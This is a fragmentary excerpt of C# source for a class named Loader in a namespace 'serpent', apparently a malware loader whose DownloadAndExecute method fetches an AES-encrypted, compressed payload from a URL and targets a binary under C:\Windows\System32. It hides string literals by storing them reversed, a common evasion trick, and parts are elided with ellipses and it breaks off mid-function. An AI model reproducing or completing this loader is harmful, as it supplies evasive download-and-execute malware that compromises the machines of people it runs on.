...
namespace serpent
{
    public class Loader
    {
        ...
        public static void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm, byte[] AESKey, byte[] AESIV)
        {
            ...
            string binaryPath = new string("\\23metsyS\\swodniW\\:C".ToCharArray().Reverse().ToArray()) + binary;
        ...
        public static byte[] Decompress(byte[] data, string CompressionAlgorithm)
        {
            ...
            if (CompressionAlgorithm == new string("9etalfed".ToCharArray().Reverse().ToArray()))
            {
            ...
            else if (CompressionAlgorithm == new string("pizg".ToCharArray().Reverse().ToArray()))
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (MemoryStream compressStream = new MemoryStream(data))
